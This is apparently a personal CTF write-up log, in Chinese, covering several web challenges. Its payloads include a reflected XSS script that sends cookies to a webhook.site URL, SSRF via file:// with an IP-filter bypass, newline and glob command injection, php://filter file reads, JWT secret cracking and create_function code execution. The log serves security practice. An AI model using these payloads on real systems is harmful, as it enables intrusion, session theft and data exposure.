## 3.28

#### nextGen 1

在前端源代码中找到了js：

```js
function myFunc(eventObj) {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function () {
      if (this.readyState == 4 && this.status == 200) {
        document.getElementById("content").innerHTML = xhttp.responseText;
      }
    };
    xhttp.open("POST", '/request');
    xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhttp.send("service=" + this.attributes.link.value);

  }

  var dep = document.getElementsByClassName('department');
  for (var i = 0; i < dep.length; i++) {
    dep[i].addEventListener('click', myFunc);
  }
```

向/request路由发POST请求返回数据；

将service替换为提示里的flag.txt,并利用file协议读取:![image-20260403112606722](../images/image-20260403112606722.png)![image-20260403112631923](../images/image-20260403112631923.png)


#### nextGen 2

在1的基础上加了过滤：![image-20260328201451605](../images/image-20260328201451605.png)

这里把127.0.0.1给过滤了，将其转化成十进制来绕过。

![image-20260328201434709](../images/image-20260328201434709.png)
```
ssrf漏洞相关：https://www.cnblogs.com/miruier/p/13907150.html
```

#### Whois

在前端的源代码中找到了表单发送的地址：![image-20260328201908301](../images/image-20260328201908301.png)

访问/query.php：

```php
<?php

error_reporting(0);

$output = null;
$host_regex = "/^[0-9a-zA-Z][0-9a-zA-Z\.-]+$/";
$query_regex = "/^[0-9a-zA-Z\. ]+$/";

if (isset($_GET['query']) && isset($_GET['host']) && 
      is_string($_GET['query']) && is_string($_GET['host'])) {

  $query = $_GET['query'];
  $host = $_GET['host'];
  
  if ( !preg_match($host_regex, $host) || !preg_match($query_regex, $query) ) {
    $output = "Invalid query or whois host";
  } else {
    $output = shell_exec("/usr/bin/whois -h ${host} ${query}");
  }

} 
else {
  highlight_file(__FILE__);
  exit;
}
```

这里接收两个参数host和query在shell_exec里执行bin目录下的whois命令;

```tex
shell_exec — 通过 shell 执行命令并将完整的输出以字符串的方式返回
```

这里对两个参数的过滤用的是一个字符串的判断和一个正则的匹配；

这里可以传入：

```
payload：?host=whois.networksolutions.com%0A&query=cat%20thisistheflagwithrandomstuffthatyouwontguessJUSTCATME
```

```
其中%0A时换行符的url编码；传入字符串后会被php解析为host=whois.networksolutions.com

而shell_exec中可以通过换行来执行新命令；
```

![image-20260328202720851](../images/image-20260328202720851.png)

#### filter-madness

在info里的phpinfo直接找到flag：

![image-20260328204515118](../images/image-20260328204515118.png)

#### charlottesweb

点击按钮![image-20260328204616268](../images/image-20260328204616268.png)

弹出提示：![image-20260328204629588](../images/image-20260328204629588.png)

在前端源代码中找到信息：![image-20260328204710954](../images/image-20260328204710954.png)

![image-20260328204722012](../images/image-20260328204722012.png)

根据提示利用PUT请求：![image-20260328204810693](../images/image-20260328204810693.png)

#### zombie-101

![image-20260328205017412](../images/image-20260328205017412.png)

测试`<script>alert(1)</script>`存在xss注入：![image-20260328205053578](../images/image-20260328205053578.png)

通过上面的表单传入payload构造反射型xss将脚本传入在这个地址中；再将这个地址复制放入下面的表单让admin访问得到cookie；

```js
<script> var xhr = new XMLHttpRequest(); xhr.open("GET", "https://webhook.site/6cdabdc5-726f-4fa6-9739-93e092999b17?c="+document.cookie, true); xhr.send(); </script>
```

![image-20260328205211087](../images/image-20260328205211087.png)

#### ？？？？

![image-20260328210506064](../images/image-20260328210506064.png)

在控制台修改后输入yulige：![image-20260328210543324](../images/image-20260328210543324.png)

```php
#se3ll.php
<?php
error_reporting(0);
highlight_file(__FILE__);
//echo "flag is in fl4g_is_here.php";

$cmd = $_POST['cmd'];
if(preg_match("/[A-Za-ko-z0-9]+/", $cmd)){
    die("hacker!");
}
$blacklist = "~!@#%^$&\/*()（）<>《》-_{}[]'/\":,";
        foreach(str_split($blacklist) as $char) {
            if(strchr($cmd, $char) !== false) 
                die('Big Hacker!!');
        }
system($cmd);
?>
```

通过正则和黑名单过滤了一批字符：剩下的可见字符：

```
 + . ; = ? ` l m n | ~
```

传入payload：

```
cmd=nl ????????????.???
其中nl 是 Linux 系统中一个简单但实用的命令行工具，全称为 "number lines"（行号）。它的主要功能是读取文件内容并为每一行添加行号，然后将结果输出到标准输出。
```

![image-20260328211626012](../images/image-20260328211626012.png)





## 3.29

#### close eyes

登录表单中输入什么都报错：![image-20260329135110579](../images/image-20260329135110579.png)

前端源代码中的js文件里是一个登录请求：![image-20260329135156611](../images/image-20260329135156611.png)

没什么用，利用dirserch扫描目录得到：![image-20260329135440383](../images/image-20260329135440383.png)

访问/phpinfo.php搜索flag得到：![image-20260329135548154](../images/image-20260329135548154.png)

#### cookies

进入页面，万能密码登录：![image-20260329142136501](../images/image-20260329142136501.png)

显示：![image-20260329142151404](../images/image-20260329142151404.png)

根据题目查看cookie：![image-20260329142217453](../images/image-20260329142217453.png)

去掉%3D解密后：![image-20260329142249816](../images/image-20260329142249816.png)

将username替换为admin加密回去后：![image-20260329142337883](../images/image-20260329142337883.png)

#### jwt

进入页面，用万能密码登录：![image-20260329145133040](../images/image-20260329145133040-17751855460781.png)

跟上面cookie那道题一样的逻辑，在cookie中找到了jwt令牌：![image-20260329145237919](../images/image-20260329145237919.png)

利用jwt.io解析jwt令牌得到：x

但是在页面中没有找到对应的密钥，利用工具c-jwt-cracker暴力解密钥得到：njupt

![image-20260329145049267](../images/image-20260329145049267.png)

将jwt中的载荷中的user替换为admin，role替换为admin；加密回去：![image-20260329145607990](../images/image-20260329145607990.png)

将修改后的jwt令牌替换回去，得到flag：![image-20260329145638461](C:\Users\zml\AppData\Roaming\Typora\typora-user-images\image-20260329145638461.png)

#### intval

```php
<?php
highlight_file(__FILE__);
include("ffllaagg.php");
//1st
if(isset ($_GET['0xGame']) && isset($_GET['id'])) {
    if($_GET['0xGame'] !== '20201001' && preg_match('/^20201001$/',$_GET['0xGame']))
       echo 'Good job!'.'<br>';
    else
       die('Think it over!');
//2st
    $id=intval($_GET['id']);
    if($_GET['id'] != 1024 && $id === 1024)
        echo 'Congratulations!'.'<br>'.$flag;
    else
        die('Work harder!');
}
```

```
1st中需要传入的0xGame不能等于20201001，但是preg_match要匹配成功可以使用%0A来绕过；preg_match不仅匹配字符串的末尾，还会匹配字符串末尾的换行符；
2st中传入的id不能等于1024但是经过intval处理后等于1024；intval() 函数会从字符串的开头开始解析，直到遇到第一个非数字字符为止。可以使用小数来绕过。
payload：?0xGame=20201001%0A&id=1024.1
```

![image-20260329152119689](../images/image-20260329152119689.png)

## 3.30

#### just-work-type

提示：![image-20260330121455485](../images/image-20260330121455485.png)

根据题目给出的用户登录：![image-20260330121529048](../images/image-20260330121529048.png)

![image-20260330121535576](../images/image-20260330121535576.png)

在cookie中找到了身份令牌：![image-20260330121626754](C:\Users\zml\AppData\Roaming\Typora\typora-user-images\image-20260330121626754.png)

放到jwt.io中解析得到：![image-20260330121715019](../images/image-20260330121715019.png)

利用c-jwt-cracker解密得到密钥：![image-20260330122011570](../images/image-20260330122011570.png)

将admin的false替换为true加密回去得到jwt令牌：![image-20260330122145340](../images/image-20260330122145340.png)

替换cookie中的令牌，得到flag：![image-20260330122203483](../images/image-20260330122203483.png)

#### simple web app

进入页面，是一个登录窗口：![image-20260330122315608](../images/image-20260330122315608.png)

注册用户登录后，只有一个profile页面：![image-20260330123306151](../images/image-20260330123306151.png)

然后就没有其余信息了，前端源代码中的js里有两段：

```js
#scripts.js
function submitLogRegForm(event) {
    event.preventDefault();
    let formData = new FormData(event.target);
    
    var data = {};
    formData.forEach((value, key) => data[key] = value);
    
    let xhr = new XMLHttpRequest();
    xhr.addEventListener("load", reqListener);
    xhr.open(event.target.method, event.target.action);
    xhr.setRequestHeader('Content-type', 'application/json');
    xhr.send(JSON.stringify(data));
}

function reqListener() {
    let { success, message } = JSON.parse(this.response);

    let div = document.createElement("div");
    div.innerHTML = message;
    div.id = "result-submit";
    if (success) {
        div.className = "text-success text-center";
        if (window.location.pathname === '/login') window.location.reload();
    } else 
        div.className = "text-danger text-center";
   
    // if this element exists already, remove it
    let elem = document.getElementById(div.id);
    if (elem !== null) elem.remove();

    // attach it the new one
    let parent = document.getElementById("form");
    parent.prepend(div);

}

document.getElementById("form").onsubmit = submitLogRegForm;
```

```js
#profile-script.js
function sendGQL(query, callback) {
    let xhr = new XMLHttpRequest();
    xhr.addEventListener("load", callback);
    xhr.open("POST", "/graphql");
    xhr.setRequestHeader('Content-type', 'application/json');
    xhr.send(JSON.stringify(query));
}

function getData() {
    let query = {query: `
        {
            user { 
                username,
                email
            }
        }
    `};

    sendGQL(query, reqListener)
}

function reqListener() {
    let info = JSON.parse(this.response).data.user;

    let div = document.getElementById('username');
    div.innerHTML = info.username;

    div = document.getElementById('email');
    div.innerHTML = info.email;
}

getData();
```

前一个js是实现登录和注册的表单发送；而后一个js是向后端请求数据，利用了graphql；

```
这里讲一下什么是graphql：
正常来说一个前后端的项目，前端负责渲染后端api提供的数据；而后端的话一般回进行数据库的增删改查，一个操作对应着一种api，比如adduser，updateuser，deleteuser，queryuser；而graphql只需要提供一个api，根据请求体不同，返回值不同；比如这里的query对应的curd中的查，而mutation中对应着剩下的增删改；
```

这里利用插件Altair GraphQL Client查看这个graphql中的接口文档：![image-20260330184610945](../images/image-20260330184610945.png)

在插件中打开：![image-20260330184629298](../images/image-20260330184629298.png)

点击docs查看接口文档：![image-20260330184740483](../images/image-20260330184740483.png)

![image-20260330184753294](../images/image-20260330184753294.png)

![image-20260330184812997](../images/image-20260330184812997.png)

可以看到这里对应的三种身份，admin，user，moderator；

我们注册的是user身份：![image-20260330184912898](../images/image-20260330184912898.png)

这里可以通过新注册一个admin用户来得到admin权限：![image-20260330185017942](../images/image-20260330185017942.png)

回去登录得到flag：![image-20260330185045326](../images/image-20260330185045326.png)

## 3.31

#### getpost

给出了源代码：

```php
<?php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['0xGame']) && isset($_POST['X1cT34m'])){
    $a = $_GET['0xGame'];
    $b = $_POST['X1cT34m'];
    $c = 'acd666tql';
    if($a === $c && $b === $c){
        echo $flag;
    }
}else{
    die("Do you konw GET & POST ?");
} Do you konw GET & POST ?
```

按照要求，传入两个参数：![image-20260331121324413](../images/image-20260331121324413.png)

#### just_login

与3.29日的closeeyes页面相同，试了一下phpinfo.php，在信息页面找到flag：![image-20260331121529339](../images/image-20260331121529339.png)

#### read flag

进入页面，提示输入linux命令：![image-20260331121622191](../images/image-20260331121622191.png)

前端源代码中提示flag位置：![image-20260331121653829](../images/image-20260331121653829.png)

先输入`ls /`，再输入`cat /flag`:![image-20260331121759990](../images/image-20260331121759990.png)

![image-20260331121807888](../images/image-20260331121807888.png)

#### wh1sper's_secret_garden

进入页面，提示需要用wh1sper浏览器，更改user_agent：![image-20260331121851485](../images/image-20260331121851485.png)

再次访问：![image-20260331121943465](../images/image-20260331121943465.png)

利用Refer伪造请求源：![image-20260331122155908](../images/image-20260331122155908.png)

最后利用XFF伪造本地请求：![image-20260331122242715](../images/image-20260331122242715.png)

#### robots

进入页面：![image-20260331122324257](../images/image-20260331122324257.png)

点击超链接后跳转到百度：![image-20260331122410127](../images/image-20260331122410127.png)

根据题目名，想到robots.txt,再其中找到信息：![image-20260331122446908](../images/image-20260331122446908.png)

访问得到flag：![image-20260331122518624](../images/image-20260331122518624.png)

#### switch

进入页面，提示是vim的缓存文件：![image-20260331122614064](../images/image-20260331122614064.png)

利用/.index.php.swp得到缓存文件：

![image-20260331123805420](../images/image-20260331123805420.png)

虽然有很多乱码，但是仍能看到它接收了两个参数file和id；而且还有一些过滤，file正则匹配不能有filter，base64，利用大小写绕过；id需要等于2，但是如果是纯数字的话，又会为真返回nonono，利用弱类型比较来绕过输入id=2a；

```
payload：file=php://Filter/convert.Base64-encode/resource=flag.php&id=2a
```

![image-20260331124744505](../images/image-20260331124744505.png)

解码得到：![image-20260331124757970](../images/image-20260331124757970.png)

#### view source

进入页面：![image-20260331124849972](../images/image-20260331124849972.png)

在前端源代码中找到：![image-20260331124931629](../images/image-20260331124931629.png)

#### booli

给出提示，能在不用暴力的方式下登录吗：![image-20260331125507831](../images/image-20260331125507831.png)

使用万能密码登录失败；dirsearch也没有扫出东西；

```php
<?php
include("config.php");
$conn = mysqli_connect($dbhost, $dbuser, $dbpass);
if(!$conn)
    die("error");
if(isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $sql = "select * from test.0xgame_users where username = \"$username\" and password = \"$password\"";
    $result = mysqli_query($conn, $sql);
    if($result){
        die("0xGame{3a5y_w4n_n3ng_m1m4}");
    }else{
        die("Not this way, nothing in database");
    }
}
mysqli_close($conn);
```

这里是题目的源码，万能密码应该能过，但不知道为什么过不了。

#### bug1

源码审计：

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(empty($_POST['Poria']) || empty($_POST['Pupi1'] || empty($_POST['N1k0la']) )){
    die("my secret is very big, u bear it");
}

$secret_key = getenv("secret");//这里从环境变量中读取secret

if(isset($_POST['N1k0la']))
    $secret_key = hash_hmac('sha256', $_POST['N1k0la'], $secret_key);//这里将原本的密钥再次加密

$payload = hash_hmac('sha256', $_POST['Pupi1'], $secret_key);//这里将Pupil加密

if($payload !== $_POST['Poria']){ //这里要通过一个验证，需要输入的poria与前面加密得到的payload相同
    die("hahaha u can't find my secret, or maybe u don't need to find it");
}
if(empty($_POST['action'])){
    show_source(__FILE__);
}
else{
    $_POST['action']('',$_POST['Pupi1']); //这里可以使用create_function('','')来实现rce；
}
my secret is very big, u bear it
```

```
根据提示，我们不一定要得到密钥；这里的hash_hmac()函数接收三个参数，一个加密方式，一个待加密的数据，一个密钥，但我们输入为空时，就会报错，返回NULL；有了NULL后就可以自己运算得到加密后的payload；最后就是 $_POST['action']('',$_POST['Pupi1']);可以利用create_function来调用Pupil传入的命令；
这里讲一下create_function:
例子一：create_function('$a,$b', 'return "ln($a) + ln($b) = " . log($a * $b);');
例子二：function($a,$b) { return "ln($a) + ln($b) = " . log($a * $b); };
上面的函数本质就是下面的匿名函数，但是它会在内部执行eval；所以但我们将Pupil设置为：};system('printenv');//来闭合前面的匿名函数，设置action为create_function；就可以得到function() {};system('printenv');//}来rce了
```

通过传入数组使得输入为空；![image-20260331185559227](../images/image-20260331185559227.png)

得到加密后的Pupil；

合成payload：

```
N1k0la%5B%5D=1&Poria=060d796ce97339ce12f69b10d85310c8bc654824f2b80ccce121002a2e6afb8a&Pupi1=%7D%3Bsystem%28%22printenv%22%29%3B%2F%2F&action=create_function
```

得到flag：![image-20260331185700681](../images/image-20260331185700681.png)

#### bug2

根据提示POST一个参数进去，但是过滤了system,引号，file等：![image-20260331185930765](../images/image-20260331185930765.png)

传入phpinfo():![image-20260331190326043](../images/image-20260331190326043.png)

#### command

进入页面：![image-20260331190656120](../images/image-20260331190656120.png)

做过类似的题，所以直接就堆叠注入了；这里的按钮被disable了；要先用f12修改一下前端代码：

![image-20260331190815691](../images/image-20260331190815691.png)

输入127.0.0.1；ls：![image-20260331190844659](../images/image-20260331190844659.png)

ls /得到根目录：

cat /flag得到flag：![image-20260331190950231](../images/image-20260331190950231.png)
